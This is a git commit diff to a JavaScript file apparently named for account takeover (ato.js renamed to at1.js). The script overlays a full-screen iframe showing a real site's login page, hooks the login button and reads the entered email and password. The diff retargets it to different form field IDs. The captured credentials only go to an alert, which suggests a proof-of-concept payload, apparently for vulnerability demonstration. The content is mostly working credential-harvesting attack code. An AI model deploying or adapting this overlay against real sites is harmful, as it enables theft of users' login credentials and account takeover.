f1fb72e3f37e0f1b8cd9456de35944a5b7373e20
bbpa <57352896+bbpa@users.noreply.github.com>
2024-06-19 11:48:53 +0330

    Update and rename ato.js to at1.js

--- at1.js
+++ at1.js
@@ -11,11 +11,11 @@ iframe.src="https://www.puritan.com/login"
 iframe.style="position: fixed; top:0; left:0; bottom:0; right:0; width: 100%; height:100%; border:none; margin:0; padding:0; overflow: hidden; z-index:999999;";
 document.body.appendChild(iframe)
 iframe.contentWindow.addEventListener("DOMContentLoaded", () => {
-let loginbutton=iframe.contentWindow.document.getElementById("login_submit");
+let loginbutton=iframe.contentWindow.document.getElementsByTagName("button")[1]
 loginbutton.onclick=()=>
 {
-let email=iframe.contentWindow.document.getElementById("Email").value;
-let pass=iframe.contentWindow.document.getElementById("Password").value;
+let email=iframe.contentWindow.document.getElementById("vusuario").value;
+let pass=iframe.contentWindow.document.getElementById("vpassword").value;
 alert(`${email} : ${pass}`)
 }
 
